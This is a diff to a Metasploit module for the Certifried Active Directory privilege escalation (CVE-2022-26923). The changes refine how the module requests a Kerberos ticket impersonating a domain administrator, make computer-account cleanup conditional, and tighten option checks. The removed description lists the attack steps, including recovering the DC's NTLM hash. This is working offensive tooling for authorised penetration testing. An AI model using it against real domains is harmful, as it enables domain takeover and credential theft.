@@ -29,17 +29,6 @@ class MetasploitModule < Msf::Auxiliary
           with its NTLM hash. Finally, it requests a TGS impersonating a
           privileged user (Administrator by default). This TGS can then be used
           by other modules or external tools.
-
-          This will go through the following steps:
-          1. Check if the current user `ms-DS-MachineAccountQuota` let him add a computer account
-          2. Create a computer account
-          3. Change the new computer's `dNSHostName` attribute to match that of the DC
-          4. Request a certificate for this computer account and cache it
-          5. Authenticate to the remote host with the DC account's certificate and cache the TGT
-          6. Retrieve the DC account's NTLM hash
-          7. Escalate privileges by requesting a TGS impersonating a privileged domain user
-          8. Delete the computer account (only possible if the privilege
-          escalation succeeded or if the current user is an administrator)
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -51,6 +40,7 @@ class MetasploitModule < Msf::Auxiliary
         'References' => [
           ['URL', 'https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4'],
           ['URL', 'https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html'],
+          ['CVE', '2022-26923']
         ],
         'Notes' => {
           'AKA' => [ 'Certifried' ],
@@ -76,11 +66,15 @@ class MetasploitModule < Msf::Auxiliary
       # Using USERNAME, PASSWORD and DOMAIN options defined by the LDAP mixin
       OptString.new('DC_NAME', [ true, 'Name of the domain controller being targeted (must match RHOST)' ]),
       OptInt.new('LDAP_PORT', [true, 'LDAP port (default is 389 and default encrypted is 636)', 636]), # Set to 636 for legacy SSL
+      OptString.new('DOMAIN', [true, 'The domain to authenticate to']),
+      OptString.new('USERNAME', [true, 'The username to authenticate with']),
+      OptString.new('PASSWORD', [true, 'The password to authenticate with']),
       OptString.new(
         'SPN', [
           false,
-          'The Service Principal Name used to request the impersonated TGS, format is service_name/FQDN '\
-          '(e.g. cifs/dc01.mydomain.local). "cifs/<DC_NAME>.<DOMAIN>" will be used if not set.',
+          'The Service Principal Name used to request an additional impersonated TGS, format is "service_name/FQDN" '\
+          '(e.g. "ldap/dc01.mydomain.local"). Note that, independently of this option, a TGS for "cifs/<DC_NAME>.<DOMAIN>"'\
+          ' will always be requested.',
         ],
         conditions: %w[ACTION == PRIVESC]
       ),
@@ -99,6 +93,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     @privesc_success = false
+    @computer_created = false
 
     opts = {}
     validate_options
@@ -108,6 +103,7 @@ class MetasploitModule < Msf::Auxiliary
 
     opts[:tree] = connect_smb
     computer_info = add_computer(opts)
+    @computer_created = true
     disconnect_smb(opts.delete(:tree))
 
     impersonate_dc(computer_info.name)
@@ -129,8 +125,19 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if action.name == 'PRIVESC'
-      request_ticket(credential)
+      # Always request a TGS for `cifs/...` SPN, since we need it to properly delete the computer account
+      default_spn = "cifs/#{datastore['DC_NAME']}.#{datastore['DOMAIN']}"
+      request_ticket(credential, default_spn)
       @privesc_success = true
+
+      # If requested, get an additional TGS
+      if datastore['SPN'].present? && datastore['SPN'].casecmp(default_spn) != 0
+        begin
+          request_ticket(credential, datastore['SPN'])
+        rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
+          print_error("Unable to get the additional TGS for #{datastore['SPN']}: #{e.message}")
+        end
+      end
     end
   rescue MsSamrConnectionError, MsIcprConnectionError => e
     fail_with(Failure::Unreachable, e.message)
@@ -144,30 +151,34 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::UnexpectedReply, e.message)
   rescue MsSamrUnknownError, MsIcprUnknownError => e
     fail_with(Failure::Unknown, e.message)
+  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
+    fail_with(Failure::Unknown, e.message)
   ensure
-    print_status("Deleting the computer account #{computer_info&.name}")
-    disconnect_smb(opts.delete(:tree)) if opts[:tree]
-    if @privesc_success
-      # If the privilege escalation succeeded, let'use the cached TGS
-      # impersonating the admin to delete the computer account
-      datastore['SMBAuth'] = Msf::Exploit::Remote::AuthOption::KERBEROS
-      datastore['SmbRhostname'] = "#{datastore['DC_NAME']}.#{datastore['DOMAIN']}"
-      datastore['SMBDomain'] = datastore['DOMAIN']
-      datastore['DomainControllerRhost'] = rhost
-      tree = connect_smb(username: datastore['IMPERSONATE'])
-    else
-      tree = connect_smb
+    if @computer_created
+      print_status("Deleting the computer account #{computer_info&.name}")
+      disconnect_smb(opts.delete(:tree)) if opts[:tree]
+      if @privesc_success
+        # If the privilege escalation succeeded, let'use the cached TGS
+        # impersonating the admin to delete the computer account
+        datastore['SMBAuth'] = Msf::Exploit::Remote::AuthOption::KERBEROS
+        datastore['SmbRhostname'] = "#{datastore['DC_NAME']}.#{datastore['DOMAIN']}"
+        datastore['SMBDomain'] = datastore['DOMAIN']
+        datastore['DomainControllerRhost'] = rhost
+        tree = connect_smb(username: datastore['IMPERSONATE'])
+      else
+        tree = connect_smb
+      end
+      opts = {
+        tree: tree,
+        computer_name: computer_info&.name
+      }
+      begin
+        delete_computer(opts) if opts[:tree] && opts[:computer_name]
+      rescue MsSamrUnknownError => e
+        print_warning("Unable to delete the computer account, this will have to be done manually with an Administrator account (#{e.message})")
+      end
+      disconnect_smb(opts.delete(:tree)) if opts[:tree]
     end
-    opts = {
-      tree: tree,
-      computer_name: computer_info&.name
-    }
-    begin
-      delete_computer(opts) if opts[:tree] && opts[:computer_name]
-    rescue MsSamrUnknownError => e
-      print_warning("Unable to delete the computer account, this will have to be done manually with an Administrator account (#{e.message})")
-    end
-    disconnect_smb(opts.delete(:tree)) if opts[:tree]
   end
 
   def validate_options
@@ -180,8 +191,17 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['DOMAIN'].blank?
       fail_with(Failure::BadConfig, 'DOMAIN not set')
     end
-    if datastore['SPN'].present? && !datastore['SPN'].match(%r{.+/.+})
-      fail_with(Failure::BadConfig, 'SPN format must be service_name/FQDN (ex: cifs/dc01.mydomain.local)')
+    unless datastore['DOMAIN'].match(/.+\..+/)
+      fail_with(Failure::BadConfig, 'DOMAIN format must be FQDN (ex: mydomain.local)')
+    end
+    if datastore['CA'].blank?
+      fail_with(Failure::BadConfig, 'CA not set')
+    end
+    if datastore['DC_NAME'].blank?
+      fail_with(Failure::BadConfig, 'DC_NAME not set')
+    end
+    if datastore['SPN'].present? && !datastore['SPN'].match(%r{.+/.+\..+\..+})
+      fail_with(Failure::BadConfig, 'SPN format must be <service_name>/<hostname>.<FQDN> (ex: cifs/dc01.mydomain.local)')
     end
   end
 
@@ -479,11 +499,7 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def request_ticket(credential)
-    spn = datastore['SPN']
-    if spn.blank?
-      spn = "cifs/#{datastore['DC_NAME']}.#{datastore['DOMAIN']}"
-    end
+  def request_ticket(credential, spn)
     print_status("Getting TGS impersonating #{datastore['IMPERSONATE']}@#{datastore['DOMAIN']} (SPN: #{spn})")
 
     dc_name = datastore['DC_NAME'].dup.downcase
